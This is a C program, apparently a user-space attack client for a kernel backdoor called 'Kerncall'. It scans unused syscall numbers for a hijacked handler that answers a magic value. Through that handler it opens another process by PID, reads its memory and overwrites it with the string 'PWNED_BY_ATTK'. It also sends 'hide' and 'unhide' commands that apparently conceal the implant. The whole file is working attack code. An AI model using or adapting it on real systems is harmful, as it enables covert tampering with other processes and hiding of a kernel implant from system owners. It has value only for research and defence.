// SPDX-License-Identifier: GPL-2.0-only
/*
 * Copyright (C) 2026 dere3046
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <unistd.h>

#define ARRAY_SIZE(a) (sizeof(a) / sizeof((a)[0]))

#define RWMEM_KEY "rwmem"
#define RWMEM_CMD_HELLO 0x1000 /* Kerncall SC_CMD_HELLO */
#define RWMEM_CMD_OPEN  0x1001
#define RWMEM_CMD_READ  0x1002
#define RWMEM_CMD_WRITE 0x1003
#define RWMEM_CMD_CLOSE 0x1004
#define RWMEM_CMD_HIDE   0x1300
#define RWMEM_CMD_UNHIDE 0x1301
#define RWMEM_MAGIC     0x53434831UL /* Kerncall SC_MAGIC */

static const int empty_slots[] = {
	18, 42,
	249, 250, 251, 252, 253, 254, 255, 256, 257,
	295, 296, 297, 298, 299, 300,
	415,
	-1,
};

static const long pref_slots[] = { 249, 42, 18, 415 };

static long find_slot(void)
{
	size_t i;

	for (i = 0; i < ARRAY_SIZE(pref_slots); i++) {
		long nr = pref_slots[i];

		if (syscall(nr, RWMEM_KEY, RWMEM_CMD_HELLO, 0, 0, 0, 0) ==
		    (long)RWMEM_MAGIC)
			return nr;
	}
	for (i = 0; empty_slots[i] >= 0; i++) {
		long nr = empty_slots[i];

		if (syscall(nr, RWMEM_KEY, RWMEM_CMD_HELLO, 0, 0, 0, 0) ==
		    (long)RWMEM_MAGIC)
			return nr;
	}
	return -1;
}

int main(int argc, char **argv)
{
	long slot;
	long handle;
	pid_t pid;
	unsigned long addr;
	char buf[32];

	if (argc < 3) {
		printf("[attacker] usage: %s <pid> <addr>\n", argv[0]);
		return 1;
	}
	pid = atoi(argv[1]);
	addr = strtoul(argv[2], NULL, 16);

	slot = find_slot();
	if (slot < 0) {
		printf("[attacker] no slot\n");
		return 1;
	}
	printf("[attacker] slot: %ld\n", slot);

	if (argc >= 4) {
		long cmd;

		if (!strcmp(argv[3], "hide"))
			cmd = RWMEM_CMD_HIDE;
		else if (!strcmp(argv[3], "unhide"))
			cmd = RWMEM_CMD_UNHIDE;
		else
			return 1;
		printf("[attacker] %s: %ld\n", argv[3],
		       syscall(slot, RWMEM_KEY, cmd, 0, 0, 0, 0));
		return 0;
	}

	handle = syscall(slot, RWMEM_KEY, RWMEM_CMD_OPEN, pid, 0, 0, 0);
	if (handle < 0) {
		printf("[attacker] open failed: %ld\n", handle);
		return 1;
	}
	printf("[attacker] handle: %ld\n", handle);

	memset(buf, 0, sizeof(buf));
	syscall(slot, RWMEM_KEY, RWMEM_CMD_READ, handle, addr, 16, (long)buf);
	printf("[attacker] read: %s\n", buf);

	syscall(slot, RWMEM_KEY, RWMEM_CMD_WRITE, handle, addr, 14,
		(long)"PWNED_BY_ATTK");

	memset(buf, 0, sizeof(buf));
	syscall(slot, RWMEM_KEY, RWMEM_CMD_READ, handle, addr, 16, (long)buf);
	printf("[attacker] after: %s\n", buf);

	syscall(slot, RWMEM_KEY, RWMEM_CMD_CLOSE, handle, 0, 0, 0);
	return 0;
}
